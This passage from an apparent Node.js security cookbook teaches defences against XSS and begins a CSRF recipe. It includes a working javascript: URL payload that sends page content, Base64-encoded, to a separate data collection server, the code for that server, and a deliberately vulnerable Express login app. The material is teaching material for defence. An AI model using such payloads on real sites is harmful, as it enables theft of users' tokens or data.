     <span class="koboSpan" id="kobo.1744.1">
      web page.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1745.1">
     All input to our server should be validated and sanitized before use.
    </span>
    <span class="koboSpan" id="kobo.1745.2">
     This includes indirect inputs to data
    </span>
    <a id="_idIndexMarker759">
    </a>
    <span class="koboSpan" id="kobo.1746.1">
     stores as these may be used to conduct persistent
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1747.1">
      XSS attacks.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-303">
    <a id="_idTextAnchor310">
    </a>
    <span class="koboSpan" id="kobo.1748.1">
     There’s more…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.1749.1">
     There are some other types of XSS attacks that we can still use to harm our server.
    </span>
    <span class="koboSpan" id="kobo.1749.2">
     Let’s demonstrate these attacks and learn how we can help
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1750.1">
      prevent them.
     </span>
    </span>
   </p>
   <h3>
    <span class="koboSpan" id="kobo.1751.1">
     Protocol-handler XSS
    </span>
   </h3>
   <p>
    <span class="koboSpan" id="kobo.1752.1">
     The fixed server from this
    </span>
    <a id="_idIndexMarker760">
    </a>
    <span class="koboSpan" id="kobo.1753.1">
     recipe is still vulnerable to some other types of XSS.
    </span>
    <span class="koboSpan" id="kobo.1753.2">
     In this scenario, we’ll pretend that the status value is privileged information that the attacker shouldn’t be able
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1754.1">
      to read.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1755.1">
     The flow of this attack is to create a malicious data collection server that injects a script into the web page that obtains the information and then forwards it to the data
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1756.1">
      collection server.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1757.1">
     To demonstrate this, we need to create a data
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1758.1">
      collection server:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.1759.1">
      While still in the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1760.1">
       express-xss
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1761.1">
      directory, create a file
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1762.1">
       named
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1763.1">
        colletion-server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1764.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1765.1">$ touch collection-server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1766.1">
      Then, add the following code
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1767.1">
       to
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1768.1">
        collection-server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1769.1">
       :
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1770.1">
require('node:http')
  .createServer((req, res) =&gt; {
    console.log(
      req.connection.remoteAddress,
      Buffer.from(req.url.split('/attack/')[1],
        'base64').toString().trim()
    );
  })
  .listen(3001, () =&gt; {
    console.log('Collection Server listening on port
      3001');
  });</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1771.1">
      Now, we can start the data
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1772.1">
       collection server:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1773.1">$ node collection-server.js</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1774.1">Collection Server listening on port 3001</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1775.1">
      In a second terminal window, restart the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1776.1">
        fixed-server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1777.1">
       file:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1778.1">$ node fixed-server.js</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1779.1">Server listening on port 3000</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1780.1">
      In your browser window, visit the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1781.1">
       following URL:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1782.1">
http://localhost:3000/?previous=javascript:(new%20Image().src)=`http://localhost:3001/attack/${btoa(document.getElementById(%22status%22).innerHTML)}`,0/&amp;token=TOKEN&amp;lang=en</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1783.1">
      The web page should look
     </span>
     <a id="_idIndexMarker761">
     </a>
     <span class="koboSpan" id="kobo.1784.1">
      the same as before, still showing the
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1785.1">
       All systems are running.
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1786.1">
      message.
     </span>
     <span class="koboSpan" id="kobo.1786.2">
      However, the XSS injection has updated the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1787.1">
       href
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1788.1">
      value of the
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1789.1">
       Back
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1790.1">
      hyperlink so that it directs us to
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1791.1">
       the following:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1792.1">javascript:(new Image().src)=``http://localhost:3001/attack/${btoa(document.getElementById(status).innerHTML)}``,0 /</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.1793.1">
       The link starts with
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1794.1">
        javascript:
       </span>
      </strong>
      <span class="koboSpan" id="kobo.1795.1">
       , which is a protocol handler that allows JavaScript execution as a URI.
      </span>
      <span class="koboSpan" id="kobo.1795.2">
       When this link is clicked, an HTML image element (
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1796.1">
        &lt;img&gt;
       </span>
      </strong>
      <span class="koboSpan" id="kobo.1797.1">
       ) is created with the
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1798.1">
        src
       </span>
      </strong>
      <span class="koboSpan" id="kobo.1799.1">
       value set to the address of our data collection server.
      </span>
      <span class="koboSpan" id="kobo.1799.2">
       The
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1800.1">
        btoa()
       </span>
      </strong>
      <span class="koboSpan" id="kobo.1801.1">
       function Base64 encodes the value of the status.
      </span>
      <span class="koboSpan" id="kobo.1801.2">
       Here,
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1802.1">
        ,0
       </span>
      </strong>
      <span class="koboSpan" id="kobo.1803.1">
       is appended to the end to cause the expression to evaluate to
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1804.1">
        false
       </span>
      </strong>
      <span class="koboSpan" id="kobo.1805.1">
       – ensuring that the image
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.1806.1">
        isn’t rendered.
       </span>
      </span>
     </p>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1807.1">
      Click the
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.1808.1">
       Back
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1809.1">
      link and check the data collection server.
     </span>
     <span class="koboSpan" id="kobo.1809.2">
      You’ll see that the status has been received,
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1810.1">
       as follows:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1811.1">$ node collection-server.js</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1812.1">::1 All systems are running.</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.1813.1">
       To highlight the dangers of these attacks, imagine that this was real privileged data, such as credentials or tokens.
      </span>
      <span class="koboSpan" id="kobo.1813.2">
       By just sending a malicious link to a user and having them click on it, we could obtain their sensitive data via our
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.1814.1">
        collection server.
       </span>
      </span>
     </p>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.1815.1">
       The server is still
      </span>
      <a id="_idIndexMarker762">
      </a>
      <span class="koboSpan" id="kobo.1816.1">
       vulnerable because we can still inject values into the
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1817.1">
        href
       </span>
      </strong>
      <span class="koboSpan" id="kobo.1818.1">
       attribute.
      </span>
      <span class="koboSpan" id="kobo.1818.2">
       The safest way to avoid this is by not allowing input to determine the value of the
      </span>
      <span class="No-Break">
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.1819.1">
         href
        </span>
       </strong>
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.1820.1">
        attribute:
       </span>
      </span>
     </p>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1821.1">
      Let’s copy
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1822.1">
       fixed-server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1823.1">
      to a new file and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1824.1">
       fix it:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1825.1">$ cp fixed-server.js protocol-safe-server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1826.1">
      We’ll fix this vulnerability by installing the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1827.1">
        escape-html
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1828.1">
       module:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1829.1">$ npm install escape-html</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1830.1">
      Import the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1831.1">
       escape-html
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1832.1">
      module in
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1833.1">
       fixed-server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1834.1">
      by replacing the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1835.1">
       he
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1836.1">
      module import with the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1837.1">
       following line:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1838.1">
const escapeHTML = require('escape-html');</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1839.1">
      Then, change the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1840.1">
       href
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1841.1">
      assignment to
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1842.1">
       the following:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1843.1">
const href = escapeHTML(`/${previous}${token}/${lang}`);</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1844.1">
      Now,
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1845.1">
       start
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1846.1">
        protocol-safe-server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1847.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1848.1">$ node protocol-safe-server.js</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1849.1">Server listening on port 3000</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1850.1">
      With the data collection server still running, revisit the malicious URL and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1851.1">
       click
      </span>
     </span>
     <span class="No-Break">
      <strong class="bold">
       <span class="koboSpan" id="kobo.1852.1">
        Back
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1853.1">
       :
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1854.1">
http://localhost:3000/?previous=javascript:(new%20Image().src)=`http://localhost:3001/attack/${btoa(document.getElementById(%22status%22).innerHTML)}`,0/</span></pre>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.1855.1">
     You’ll observe that the request fails, and the data collection server doesn’t receive the privileged data.
    </span>
    <span class="koboSpan" id="kobo.1855.2">
     This is
    </span>
    <a id="_idIndexMarker763">
    </a>
    <span class="koboSpan" id="kobo.1856.1">
     because the link to our malicious server has
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1857.1">
      been sanitized.
     </span>
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.1858.1">
     Important note
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.1859.1">
     This chapter covered HTML encoding and modules that can be used to help escape HTML.
    </span>
    <span class="koboSpan" id="kobo.1859.2">
     Similarly, for escaping JavaScript, the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1860.1">
      jsesc
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1861.1">
     module (
    </span>
    <a href="https://www.npmjs.com/package/jsesc">
     <span class="koboSpan" id="kobo.1862.1">
      https://www.npmjs.com/package/jsesc
     </span>
    </a>
    <span class="koboSpan" id="kobo.1863.1">
     ) could be used.
    </span>
    <span class="koboSpan" id="kobo.1863.2">
     However, embedding input into JavaScript is generally considered high risk, so you should evaluate your reasons for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1864.1">
      doing so.
     </span>
    </span>
   </p>
   <h3>
    <span class="koboSpan" id="kobo.1865.1">
     Parameter validation
    </span>
   </h3>
   <p>
    <span class="koboSpan" id="kobo.1866.1">
     The browser can
    </span>
    <a id="_idIndexMarker764">
    </a>
    <span class="koboSpan" id="kobo.1867.1">
     only show a portion of a very long URL in the address bar.
    </span>
    <span class="koboSpan" id="kobo.1867.2">
     This means that for very long URLs with many parameters, you may not see what’s appended to the end of the URL.
    </span>
    <span class="koboSpan" id="kobo.1867.3">
     This makes it more challenging to identify
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1868.1">
      malicious URLs.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1869.1">
     If your application’s typical usage doesn’t involve very long URLs, then it would be prudent to add some constraints to what URLs your application will accept.
    </span>
    <span class="koboSpan" id="kobo.1869.2">
     Let’s do
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1870.1">
      that now:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.1871.1">
      Copy the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1872.1">
       server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1873.1">
      file to a new file
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1874.1">
       named
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1875.1">
        constraints-server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1876.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1877.1">$ cp server.js constraints-server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1878.1">
      Define a
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1879.1">
       validateParameters()
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1880.1">
      function that validates the URL parameters in the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1881.1">
        constraints-server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1882.1">
       file:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1883.1">
const validateParameters = ({ previous, token, lang },
  query) =&gt; {
    return (
      Object.keys(query).length &lt;= 3 &amp;&amp;
      typeof lang === 'string' &amp;&amp;
      lang.length === 2 &amp;&amp;
      typeof token === 'string' &amp;&amp;
      token.length === 16 &amp;&amp;
      typeof previous === 'string' &amp;&amp;
      previous.length &lt;= 16
    );
};</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1884.1">
      Now, we need to make a call to the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1885.1">
       validateParameters()
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1886.1">
      function in our request handler.
     </span>
     <span class="koboSpan" id="kobo.1886.2">
      Change
     </span>
     <a id="_idIndexMarker765">
     </a>
     <span class="koboSpan" id="kobo.1887.1">
      the request handler to
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1888.1">
       the following:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1889.1">
app.get('/', (req, res) =&gt; {
  const { previous, lang, token } = req.query;
</span><strong class="bold"><span class="koboSpan" id="kobo.1890.1">  if (!validateParameters({ previous, token, lang },</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1891.1">    req.query)) {</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1892.1">      res.sendStatus(422);</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1893.1">      return;</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1894.1">    }</span></strong><span class="koboSpan" id="kobo.1895.1">
  getServiceStatus((status) =&gt; {
    res.send(`
      &lt;h1&gt;Service Status&lt;/h1&gt;
      &lt;div id=status&gt;
        ${status}
      &lt;/div&gt;
      &lt;div&gt;
      &lt;a href="${previous}${token}/${lang}"&gt;Back&lt;/a&gt;
      &lt;/div&gt;
    `);
  });
});</span></pre>
    </li>
    <li>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1896.1">
       Start
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1897.1">
        constraints-server.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1898.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1899.1">$ node constraints-server.js</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1900.1">Server listening on port 3000</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1901.1">
      Test by navigating to the following URLs, all of which should fail
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1902.1">
       validation checks:
      </span>
     </span>
     <ul>
      <li>
       <span class="No-Break">
        <strong class="source-inline">
         <span class="koboSpan" id="kobo.1903.1">
          http://localhost:3000/?previous=sixteencharacter&amp;token=sixteencharacter
         </span>
        </strong>
       </span>
      </li>
      <li>
       <span class="No-Break">
        <strong class="source-inline">
         <span class="koboSpan" id="kobo.1904.1">
          http://localhost:3000/?previous=sixteencharacter&amp;token=sixteencharacter&amp;lang=en&amp;extra=value
         </span>
        </strong>
       </span>
      </li>
      <li>
       <span class="No-Break">
        <strong class="source-inline">
         <span class="koboSpan" id="kobo.1905.1">
          http://localhost:3000/?previous=characters&amp;token=sixteencharacter&amp;lang=abc
         </span>
        </strong>
       </span>
      </li>
     </ul>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.1906.1">
       The following URL should work as it satisfies all of
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.1907.1">
        the constraints:
       </span>
      </span>
     </p>
     <ul>
      <li>
       <span class="No-Break">
        <strong class="source-inline">
         <span class="koboSpan" id="kobo.1908.1">
          http://localhost:3000/?previous=sixteencharacter&amp;token=sixteencharacter&amp;lang=en
         </span>
        </strong>
       </span>
      </li>
     </ul>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.1909.1">
     Any user input should
    </span>
    <a id="_idIndexMarker766">
    </a>
    <span class="koboSpan" id="kobo.1910.1">
     be escaped and validated where possible to help prevent XSS
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1911.1">
      injection attacks.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-304">
    <a id="_idTextAnchor311">
    </a>
    <span class="koboSpan" id="kobo.1912.1">
     See also
    </span>
   </h2>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.1913.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1914.1">
       Anticipating malicious input
      </span>
     </em>
     <span class="koboSpan" id="kobo.1915.1">
      recipe in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1916.1">
       this chapter
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1917.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1918.1">
       Preventing JSON pollution
      </span>
     </em>
     <span class="koboSpan" id="kobo.1919.1">
      recipe in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1920.1">
       this chapter
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1921.1">
      The
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.1922.1">
       Preventing cross-site request forgery
      </span>
     </em>
     <span class="koboSpan" id="kobo.1923.1">
      in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1924.1">
       this chapter
      </span>
     </span>
    </li>
   </ul>
   <h1 id="_idParaDest-305">
    <a id="_idTextAnchor312">
    </a>
    <span class="koboSpan" id="kobo.1925.1">
     Preventing cross-site request forgery
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.1926.1">
     CSRF is an attack
    </span>
    <a id="_idIndexMarker767">
    </a>
    <span class="koboSpan" id="kobo.1927.1">
     where a malicious web application causes a user’s web browser to execute an action on another trusted web application where the user is
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1928.1">
      logged in.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1929.1">
     In this recipe, we’re going to learn how to secure an Express.js server against
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1930.1">
      CSRF attacks.
     </span>
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.1931.1">
     Important note
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.1932.1">
     Browser security has improved significantly in recent years.
    </span>
    <span class="koboSpan" id="kobo.1932.2">
     It’s very difficult to replicate a CSRF attack on any modern browser.
    </span>
    <span class="koboSpan" id="kobo.1932.3">
     However, as there are still many users on older browsers, it’s important to understand how these attacks work and how to protect against them.
    </span>
    <span class="koboSpan" id="kobo.1932.4">
     In this recipe, we’ll replicate a CSRF attack on the same domain.
    </span>
    <span class="koboSpan" id="kobo.1932.5">
     Please refer to the
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.1933.1">
      Developers: Get Ready for New SameSite=None; Secure Cookie Settings
     </span>
    </em>
    <span class="koboSpan" id="kobo.1934.1">
     (
    </span>
    <a href="https://blog.chromium.org/2019/10/developers-get-ready-for-new.html">
     <span class="koboSpan" id="kobo.1935.1">
      https://blog.chromium.org/2019/10/developers-get-ready-for-new.html
     </span>
    </a>
    <span class="koboSpan" id="kobo.1936.1">
     ) Chromium blog, which covers some of the updates that have been made to Google Chrome to prevent
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1937.1">
      CSRF attacks.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-306">
    <a id="_idTextAnchor313">
    </a>
    <span class="koboSpan" id="kobo.1938.1">
     Getting ready
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.1939.1">
     Follow
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1940.1">
      these steps:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.1941.1">
      Start by creating a directory named
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1942.1">
       express-csrf
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1943.1">
      for this recipe and initializing the project
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1944.1">
       with
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1945.1">
        npm
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1946.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1947.1">$ mkdir express-csrf</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1948.1">$ cd express-csrf</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1949.1">$ npm init --yes</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.1950.1">$ npm install express express-session body-parser</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1951.1">
      Create a file named
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1952.1">
       server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1953.1">
      .
     </span>
     <span class="koboSpan" id="kobo.1953.2">
      This will contain our server, which is vulnerable to
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1954.1">
       CSRF attacks:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.1955.1">$ touch server.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1956.1">
      In
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1957.1">
       server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1958.1">
      , import the required modules and register the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1959.1">
        express-session
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1960.1">
       middleware:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1961.1">
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const app = express();
const mockUser = {
  username: 'beth',
  password: 'badpassword',
  email: 'beth@example.com'
};
app.use(
  session({
    secret: 'Node Cookbook',
    name: 'SESSIONID',
    resave: false,
    saveUninitialized: false
  })
);
app.use(bodyParser.urlencoded({ extended: false }));</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1962.1">
      Next, in
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1963.1">
       server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1964.1">
      , we
     </span>
     <a id="_idIndexMarker768">
     </a>
     <span class="koboSpan" id="kobo.1965.1">
      need to define the routes for
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1966.1">
       our server:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1967.1">
app.get('/', (req, res) =&gt; {
  if (req.session.user) return
    res.redirect('/account');
  res.send(`
    &lt;h1&gt;Social Media Account - Login&lt;/h1&gt;
    &lt;form method="POST" action="/"&gt;
      &lt;label&gt; Username &lt;input name=username&gt; &lt;/label&gt;
      &lt;label&gt; Password &lt;input name=password
        type=password&gt; &lt;/label&gt;
      &lt;input type=submit&gt;
    &lt;/form&gt;
  `);
});
app.post('/', (req, res) =&gt; {
  if (
    req.body.username === mockUser.username &amp;&amp;
    req.body.password === mockUser.password
  ) {
    req.session.user = req.body.username;
  }
  if (req.session.user) res.redirect('/account');
  else res.redirect('/');
});
app.get('/account', (req, res) =&gt; {
  if (!req.session.user) return res.redirect('/');
    res.send(`
      &lt;h1&gt;Social Media Account - Settings&lt;/h1&gt;
      &lt;p&gt; Email: ${mockUser.email} &lt;/p&gt;
      &lt;form method="POST" action=/update&gt;
        &lt;input name=email value="${mockUser.email}"&gt;
        &lt;input type=submit value=Update &gt;
      &lt;/form&gt;
    `);
});
app.post('/update', (req, res) =&gt; {
  if (!req.session.user) return res.sendStatus(403);
  mockUser.email = req.body.email;
  res.redirect('/');
});</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1968.1">
      Then, add the
     </span>
     <a id="_idIndexMarker769">
     </a>
     <span class="koboSpan" id="kobo.1969.1">
      following to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1970.1">
       server.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1971.1">
      to start
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1972.1">
       the server:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.1973.1">
app.listen(3000, () =&gt; {
  console.log('Server listening on port 3000');
});</span></pre>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.1974.1">
     Now, we’re ready to start
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1975.1">
      this recipe.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-307">
    <a id="_idTextAnchor314">
    </a>
    <span class="koboSpan" id="kobo.1976.1">
     How to do it…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.1977.1">
     First, we’ll create a malicious web page that can replicate a CSRF attack.
    </span>
    <span class="koboSpan" id="kobo.1977.2">
     After that, we’ll learn how to protect our Express.js server against
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1978.1">
      these attacks.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1979.1">
     Your steps should be formatted
